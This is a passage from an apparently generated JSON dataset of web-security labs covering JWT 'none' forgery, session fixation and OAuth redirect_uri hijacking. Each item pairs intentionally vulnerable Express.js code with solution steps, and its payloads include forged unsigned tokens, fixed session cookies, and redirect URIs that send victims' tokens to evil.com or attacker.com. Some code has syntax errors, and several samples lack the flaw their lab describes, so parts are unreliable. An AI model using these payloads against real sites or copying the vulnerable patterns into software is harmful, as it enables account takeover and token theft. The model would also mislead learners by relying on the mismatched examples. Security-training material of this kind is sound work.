    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('cookie-parser')()); const users = ['carlos', 'admin', 'wiener']; app.get('/my-account', (req, res) => { const token = req.cookies.token; if (!token) return res.status(401).send('Not logged in'); const decoded = jwt.decode(token, { complete: true }); if (!decoded || !decoded.payload.username) return res.status(403).send('Invalid token'); if (!users.includes(decoded.payload.username)) return res.status(403).send('User not found'); res.send(`Account page for ${decoded.payload.username}`); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via pre-authenticated session reuse in login handler",
    "Lab Description": "This application mishandles session IDs and does not issue a new session upon successful authentication. The attacker can set a fixed session ID before login and trick a victim into logging in with that same session. To solve: Log in as Carlos by forcing a session ID and reusing it post-login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start a browser session and use Burp Suite to intercept the GET /login request.",
      "Modify the request to include a custom cookie: session=attacker123.",
      "Send the link with the crafted session cookie to Carlos and simulate a login using social engineering or CSRF.",
      "Once Carlos logs in, reuse the same session cookie (attacker123) from your browser.",
      "Visit /account to confirm the session is authenticated as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'weak-secret', resave: false, saveUninitialized: true })); const users = { carlos: 'hunter2' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.redirect('/account'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "Cookie: session=attacker123",
      "http://victim-site.com/login?phpsessid=attacker123",
      "Set-Cookie: session=attacker123; Path=/; HttpOnly"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation in authorization endpoint",
    "Lab Description": "This application implements OAuth2 authorization but fails to strictly validate redirect URIs, allowing attackers to manipulate the flow and steal access tokens. The authorization server trusts unvalidated 'redirect_uri' values. To solve: Capture a valid OAuth token for Carlos and use it to call the protected /api/user endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the OAuth request initiated by the client and observe the redirect_uri parameter.",
      "Modify the redirect_uri parameter to point to your attacker-controlled domain (http://evil.com/callback).",
      "Send a phishing link with the modified URL to Carlos to trick him into authorizing.",
      "Capture the token in your hosted endpoint (http://evil.com/callback?access_token=...).",
      "Replay the stolen access token using Postman to call GET /api/user with Authorization: Bearer <token>."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri, username } = req.query; if (username === 'carlos') { const token = 'carlos-oauth-token'; tokens[username] = token; res.redirect(`${redirect_uri}?access_token=${token}`); } else { res.status(400).send('Missing user'); } }); app.get('/api/user', (req, res) => { const authHeader = req.headers.authorization; if (authHeader && authHeader === 'Bearer carlos-oauth-token') { res.send('User: carlos, Email: carlos@example.com'); } else { res.status(403).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "http://localhost:4000/auth?username=carlos&redirect_uri=http://evil.com/callback",
      "GET /api/user HTTP/1.1\nAuthorization: Bearer carlos-oauth-token",
      "http://victim-app.com/auth?redirect_uri=http://attacker.tld/callback"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in session management",
    "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management. However, it fails to properly verify the token's signature. The `alg` field in the JWT header is set to `none`, and the application accepts tokens without verifying their integrity. The application trusts all fields in the token, including the `username` claim. To solve: Forge a JWT that impersonates the user 'carlos' and access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture the JWT from a login request using Burp Suite.",
      "Use jwt.io or Burp Decoder to inspect the token and note the use of 'alg':'none'.",
      "Craft a new token with the payload {\"username\":\"carlos\"} and set the alg to none, leaving the signature blank.",
      "Replace your JWT cookie with the forged token using Burp's Modify Cookie feature.",
      "Refresh the /my-account endpoint and confirm access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.use(require('cookie-parser')()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secret', { algorithm: 'none' }); res.cookie('auth', token); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const token = req.cookies.auth; const decoded = jwt.decode(token); if (decoded && decoded.username === 'carlos') { res.send('Account details for carlos'); } else { res.send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "JWT with header: {\"alg\":\"none\"} and payload: {\"username\":\"carlos\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token misconfiguration in API gateway authorization",
    "Lab Description": "The API gateway uses OAuth tokens for authorization. However, it fails to validate the 'aud' claim in the access token. This allows an attacker to reuse a token issued for a different client (token confusion). To solve: Use a valid OAuth access token from your own app and access the protected endpoint of a privileged client to view Carlos's email address.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to obtain a valid OAuth token from your registered client using the authorization code flow.",
      "Inspect the token in jwt.io and note the 'aud' claim is not specific to your client.",
      "Send a GET request to /api/client-a/data with your token in the Authorization header.",
      "Observe that the endpoint accepts your token and returns privileged data.",
      "Extract Carlos’s email address from the response to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.use((req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('Missing token'); const payload = jwt.decode(token); req.user = payload; next(); }); app.get('/api/client-a/data', (req, res) => { if (req.user && req.user.scope.includes('read:data')) { res.json({ email: 'carlos@example.com' }); } else { res.status(403).send('Forbidden'); } }); const PORT = 3001; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "OAuth token from Client-B reused on Client-A’s endpoint",
      "Valid JWT with aud mismatch: {\"aud\":\"Client-B\", \"scope\":\"read:data\"}",
      "Access token from attacker app reused on protected resource"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login handler",
    "Lab Description": "The application assigns session identifiers before authentication and does not regenerate them after login. This allows an attacker to set a fixed session and trick a victim into logging in under a known session ID. The attacker can then hijack the session. To solve: Fix a session, get Carlos to authenticate into it, and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to browse to the site and capture the Set-Cookie header with session ID before login.",
      "Send a crafted link to Carlos with the fixed session ID via social engineering or intercept his browser.",
      "Once Carlos logs in using the fixed session, reuse the same session ID in your browser.",
      "Access /my-account with the hijacked session and confirm it loads Carlos’s account.",
      "Validate the login success through a post-login token or visual change."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; app.get('/', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('Welcome to vulnerable site'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'letmein') { sessions[req.cookies.sid] = 'carlos'; res.send('Logged in'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); const PORT = 8080; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Fixed session ID: sid=knownvalue",
      "Trick victim into authenticating under sid=knownvalue",
      "Access /my-account with same sid cookie"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in API authorization",
    "Lab Description": "This lab exposes a REST API that uses JSON Web Tokens (JWTs) to control access. The server trusts the 'alg' field in the JWT header and does not validate its signature properly when 'alg' is set to 'none'. The application accepts user-supplied tokens without enforcing signature validation. To solve: craft a forged token to impersonate the admin user and access the protected /admin endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to intercept a legitimate login request and capture the JWT returned in the Authorization header.",
      "Decode the JWT using jwt.io and inspect the payload structure and algorithm used.",
      "Change the alg header to 'none' and modify the payload's 'user' field to 'admin'. Remove the signature entirely.",
      "Use Postman to send a GET request to /admin with the manipulated JWT in the Authorization header.",
      "Verify access by confirming the admin panel content is returned in the response."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { 'admin': { role: 'admin' }, 'user': { role: 'user' } }; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); if (payload.user === 'admin') return res.send('Admin Access Granted'); return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, 'supersecret'); if (verified.user === 'admin') return res.send('Admin Access Granted'); } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(JWT Lab running on http://localhost:${PORT}));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "This lab has a vulnerable login flow where session identifiers are issued before authentication and not regenerated after login. The session ID is predictable and can be shared across users. The application sets a cookie named session_id which is trusted without being rotated post-login. To solve: fix a session ID before login and force the victim to use it to hijack their authenticated session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to initiate a login flow and observe the issued session_id cookie prior to login.",
      "Note the format of the session ID (e.g., static prefix + incremental token).",
      "Send the login page with the fixed session ID to the victim (simulated).",
      "After the victim logs in using that session, reuse the same session ID in your browser.",
      "Access the /my-account endpoint using the fixed session ID and confirm access to victim's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; let users = { 'carlos': { password: 'secret', accountData: 'Sensitive Info' } }; app.get('/login', (req, res) => { let sid = 'sess_' + Math.floor(Math.random() * 1000); res.cookie('session_id', sid); res.send('Login page with pre-issued session'); }); app.post('/login', (req, res) => { let sid = req.cookies.session_id; let { username, password } = req.body; if (users[username] && users[username].password === password) { sessions[sid] = username; res.send('Logged in'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { let user = sessions[req.cookies.session_id]; if (user) res.send('Account data: ' + users[user].accountData); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(Session Fixation Lab running on http://localhost:${PORT}));",
    "payloads": [
      "Cookie: session_id=sess_1337",
      "POST /login with Cookie: session_id=sess_1337",
      "GET /my-account with Cookie: session_id=sess_1337"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration token reuse attack",
    "Lab Description": "This lab simulates an OAuth authorization server that fails to validate audience claims (aud) on access tokens. As a result, tokens issued for one client can be reused against another. The client application does not verify whether the token was issued for its own audience. To solve: use a token issued for one OAuth client to access a protected endpoint in another context.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP or Postman to initiate OAuth flow and obtain an access token for a benign client (e.g., photo app).",
      "Decode the JWT access token and inspect the 'aud' claim which incorrectly allows all resources.",
      "Send the same token to a different application (e.g., finance app) that incorrectly skips audience validation.",
      "Use Postman to call GET /finance-data endpoint with the reused access token.",
      "Verify successful access and extract user financial data to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const financeData = { 'carlos': 'Bank Balance: $9000' }; app.get('/finance-data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, 'oauthsharedsecret');  if (payload.sub === 'carlos') { return res.send(financeData['carlos']); } return res.status(403).send('Access Denied'); } catch (e) { return res.status(401).send('Invalid token'); } }); const PORT = 5000; app.listen(PORT, () => console.log(OAuth Lab running on http://localhost:${PORT}));",
    "payloads": [
      "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJwaG90by1hcHAifQ.mFMeNz9sZHXvl_YceRmJRW2skH43FF3A54gtpPYsOKo",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJhbGwifQ._DztOQpn9jK9i8I1vGE-FhKo8zEl5EtXfU2RoHOuWUs"
    ]
  },
  {
    "Lab scenario": "Session fixation via flawed login redirect",
    "Lab Description": "This lab implements a login flow that improperly handles session tokens. The application creates a session ID before authentication and does not regenerate it upon successful login. An attacker can abuse this behavior to fix their own session ID on a victim’s account. To solve: Hijack Carlos’s session by forcing a session ID fixation and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite Proxy to intercept GET /login request while logged out.",
      "Observe Set-Cookie header assigning a session value before login. Send this request to Burp Repeater.",
      "Note the fixed session value, and manually craft a phishing link: /login?sessionid=attackerSessionValue.",
      "Log in with Carlos’s credentials while preserving the attacker’s pre-set session ID.",
      "Verify that the session persists across pages by navigating to /account with attacker’s session value."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'secret123', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'securepass' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/account'); } else { res.status(401).send('Invalid login'); } }); app.get('/account', (req, res) => { if (req.session.user) res.send('Account page for ' + req.session.user); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "GET /login?sessionid=attackerSession123",
      "POST /login HTTP/1.1 with Cookie: session=attackerSession123",
      "GET /account HTTP/1.1 with Cookie: session=attackerSession123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion leading to privilege escalation",
    "Lab Description": "This lab uses JWT for session management but accepts unsigned tokens by trusting the 'alg' value from the token header. This allows attackers to change the algorithm to 'none' and forge tokens with elevated privileges. To solve: Craft a forged token granting admin privileges and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a JWT using Burp Suite while logged in as a normal user.",
      "Decode the JWT using jwt.io or Postman and observe 'alg': 'HS256'.",
      "Modify the header to 'alg': 'none' and add \"role\":\"admin\" to payload.",
      "Remove the signature and send the forged token using Burp Repeater.",
      "Send a GET request to /admin with the forged token as Authorization: Bearer [token] and confirm admin access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'jwtpass', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, 'secretkey'); res.json({ token }); } else { res.status(401).json({ error: 'Unauthorized' }); } }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'secretkey'); if (decoded.role === 'admin') return res.send('Welcome Admin'); res.status(403).send('Forbidden'); } catch { res.status(400).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "{ \"alg\": \"none\", \"typ\": \"JWT\" }.{ \"username\": \"carlos\", \"role\": \"admin\" }.",
      "Authorization: Bearer [unsigned JWT with admin role]",
      "GET /admin HTTP/1.1 with unsigned token"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leaking authorization codes",
    "Lab Description": "This lab uses OAuth for third-party login but fails to validate the redirect_uri properly. An attacker can abuse this to capture an authorization code meant for another user. To solve: Hijack Carlos’s OAuth code and use it to log in as him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to analyze the OAuth flow and locate redirect_uri parameter.",
      "Craft a malicious redirect_uri under attacker’s control (e.g., https://attacker.com/callback).",
      "Send phishing link to Carlos: /auth?client_id=lab-client&redirect_uri=https://attacker.com/callback",
      "Capture Carlos’s code via attacker-controlled endpoint.",
      "Send a request to /token endpoint exchanging the stolen code for an access token, then use it to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const oauthCodes = {}; app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode123'; oauthCodes[code] = 'carlos'; const redirect = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(redirect); }); app.post('/token', (req, res) => { const { code } = req.body; if (oauthCodes[code]) res.json({ access_token: 'token-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer token-carlos') res.send('Welcome back, carlos!'); else res.status(401).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "/auth?client_id=lab-client&redirect_uri=https://attacker.com/callback&state=1234",
      "POST /token HTTP/1.1 with code=authcode123",
      "Authorization: Bearer token-carlos",
      "GET /my-account HTTP/1.1 with Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation via unvalidated token reuse in REST login flow",
    "Lab Description": "The application improperly handles session identifiers during login, allowing a pre-auth session token to persist after authentication. The application sets a session cookie before authentication and does not regenerate it upon successful login. To solve: Hijack a logged-in session by fixing the session ID prior to user authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept GET /login and record the pre-auth Set-Cookie header.",
      "Send a POST /login request using valid credentials but with the previously issued session cookie manually added.",
      "Observe that the session cookie remains unchanged after login, indicating successful fixation.",
      "Send the fixed session cookie to another browser and reuse it after the victim logs in.",
      "Access /my-account endpoint using the fixed cookie and verify session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const sessions = {}; const users = { 'carlos': 'letmein123' }; app.get('/login', (req, res) => { const sid = 'sess_' + Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('sid', sid); res.send('Login page loaded'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; if (users[username] === password && sid && sessions[sid]) { sessions[sid].authenticated = true; res.send('Logged in'); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]?.authenticated) { res.send('Welcome carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "POST /login HTTP/1.1 with Cookie: sid=sess_fixation",
      "GET /my-account HTTP/1.1 with Cookie: sid=sess_fixation"
    ]
  },
  {
    "Lab scenario": "JWT token signature spoofing using 'none' algorithm in Authorization header",
    "Lab Description": "The application uses JWTs for stateless session management but fails to enforce proper signature verification. The JWT validation logic accepts 'alg: none', allowing tampering of token payload. To solve: Forge a JWT for user carlos with 'admin: true' and access the protected resource.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to login and capture the JWT from the Authorization: Bearer header.",
      "Decode the JWT and inspect the algorithm field in the header section.",
      "Craft a new JWT with {\"alg\":\"none\"} and payload {\"username\":\"carlos\",\"admin\":true}, and remove the signature.",
      "Replace the original token with the unsigned forged token in Authorization header.",
      "Send GET /admin/dashboard and verify privileged access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'topsecret'; const users = { 'carlos': 'hunter2' }; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username, admin: false }, secret); res.json({ token }); } else { res.status(401).json({ error: 'Unauthorized' }); } }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.admin) return res.send('Admin Dashboard'); res.status(403).send('Access Denied'); } catch { res.status(400).send('Invalid Token'); } }); app.listen(4001);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsImFkbWluIjp0cnVlfQ.",
      "Authorization: Bearer [forged_none_algo_token]"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect on callback endpoint",
    "Lab Description": "The application uses OAuth for third-party login, but the redirect_uri parameter is not properly validated. This allows attackers to manipulate the OAuth flow and leak authorization codes or access tokens to malicious domains. To solve: Capture Carlos’s access token via redirect hijack and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the OAuth login flow and locate the redirect_uri in the authorization request.",
      "Replace redirect_uri with a malicious domain under your control (e.g., https://evil.com/callback).",
      "Send the modified OAuth login link to Carlos and trigger login via phishing or XSS.",
      "Capture the authorization code sent to your server and exchange it for an access token.",
      "Use the stolen access token in Authorization header to access /user/profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; const code = 'mock_code_123'; res.redirect(redirect + '?code=' + code); }); app.get('/callback', async (req, res) => { const code = req.query.code; try { const tokenRes = await axios.post('https://oauth-provider/token', { code }); const token = tokenRes.data.access_token; res.send('Logged in with token: ' + token); } catch { res.status(500).send('OAuth Error'); } }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos_oauth_token') { res.send('Carlos profile'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4002);",
    "payloads": [
      "https://app.com/auth?redirect_uri=https://evil.com/callback",
      "Authorization: Bearer carlos_oauth_token"
    ]
  },
  {
    "Lab scenario": "JWT tampering via none algorithm in Authorization header",
    "Lab Description": "The application implements JWT-based authorization but does not properly validate the signing algorithm. It accepts tokens with the 'alg' field set to 'none', allowing attackers to craft unsigned tokens. The application processes JWTs sent via the 'Authorization: Bearer' header. To solve: forge a valid JWT for the user 'carlos' and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman or Burp Suite to capture the Authorization header after a successful login.",
      "Decode the JWT using jwt.io or jwt_tool and observe the 'alg' value in the header section.",
      "Modify the JWT by replacing the 'alg' value with 'none', and change the payload to {\"username\":\"carlos\"}. Remove the signature completely.",
      "Send the modified token using the Authorization: Bearer header in a GET request to /my-account endpoint.",
      "Verify successful access to Carlos's account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { carlos: 'admin123' }; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(401).send('Invalid token'); const payload = jwt.verify(token, 'secret', { algorithms: ['HS256', 'none'] }); if (payload.username === 'carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ICJjYXJsb3MifQ==."
    ]
  },
  {
    "Lab scenario": "Session fixation via login endpoint",
    "Lab Description": "The session ID is generated and sent to the client before authentication. Upon successful login, the same session ID is preserved instead of issuing a new one. This allows an attacker to fix a session ID for the victim. To solve: fix the session ID before Carlos logs in, then use the same session to access his account after he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to generate a session by visiting /login page before authentication and intercept the Set-Cookie response containing sessionID.",
      "Send a phishing link to Carlos that causes him to log in using that same sessionID (assume he logs in via crafted link).",
      "Once Carlos logs in, reuse the same sessionID cookie value to access /my-account endpoint.",
      "Send the sessionID in your cookie header using Burp Repeater to GET /my-account.",
      "Verify access to Carlos’s account using fixed session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'keyboard-cat', resave: false, saveUninitialized: true })); const users = { carlos: 'secure123' }; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.send('Logged in'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Account details for carlos'); else res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "Cookie: connect.sid=attackerFixedSessionID",
      "GET /my-account HTTP/1.1 with attackerFixedSessionID after victim login"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow redirection manipulation",
    "Lab Description": "The app uses OAuth implicit flow for authentication. The redirection URL validation is flawed, allowing attackers to steal tokens by injecting a malicious redirect_uri. The app accepts OAuth token from third-party providers and uses them to authenticate users via GET /oauth/callback. To solve: hijack Carlos’s token by crafting a malicious redirect_uri that sends the token to your server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp or Postman to analyze the OAuth authorization URL parameters, especially redirect_uri.",
      "Replace the redirect_uri parameter with a malicious value pointing to your server (e.g., https://attacker.com/callback).",
      "Send the malicious link to Carlos and make him click it (assume victim interaction).",
      "Intercept the fragment token at your server from Carlos’s browser redirection.",
      "Replay the token in GET /oauth/callback?token=xyz to impersonate Carlos and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const token = req.query.token; if (token === 'carlos_token') { res.send('Welcome back, carlos!'); } else { res.send('Invalid token'); } }); app.get('/start-auth', (req, res) => { const redirect = req.query.redirect_uri; res.redirect(`${redirect}#token=carlos_token`); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable-site.com/start-auth?redirect_uri=https://attacker.com/callback",
      "https://attacker.com/callback#token=carlos_token",
      "GET /oauth/callback?token=carlos_token"
    ]
  },
  {
    "Lab scenario": "JWT Signature None Bypass in API Token Validation",
    "Lab Description": "The API backend uses JWT for authentication, but fails to validate the signature properly when the `alg` header is manipulated. The application uses the token directly from the Authorization header to identify users without verifying the token's integrity. To solve: Forge a valid JWT token that grants admin access by bypassing the signature verification logic.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to intercept and inspect the Authorization Bearer token from a normal login request.",
      "Decode the JWT using jwt.io or Burp Decoder and observe the algorithm used (`alg: HS256`).",
      "Modify the JWT header to `alg: none` and remove the signature part entirely.",
      "Craft a new payload with `{ \"role\": \"admin\", \"username\": \"carlos\" }` and encode the header and payload with base64url.",
      "Replace the Authorization header with the tampered token and access the `/admin` or `/my-account` endpoint to confirm privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') { res.send('Admin access granted'); } else { res.send('User access only'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session Fixation in Login Token Parameter",
    "Lab Description": "The login flow uses a static session token passed in a GET parameter without proper regeneration after login. This allows a malicious actor to predetermine the victim's session ID. The application reflects the token into a cookie without regenerating it post-authentication. To solve: Fix the victim's session ID, force a login, and then reuse the session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to monitor the login flow and observe the use of `?session=` token in GET requests.",
      "Generate a session ID and pre-authenticate using it, confirming that it sets a `Set-Cookie: session` header with the same ID.",
      "Send the login link containing the malicious session ID to the victim.",
      "After the victim logs in using that link, reuse the same session cookie on your own browser or via Burp Repeater.",
      "Access `/my-account` with the hijacked session to confirm access to the victim's data."
    ],
    "Vulnerability name": "Authentication",
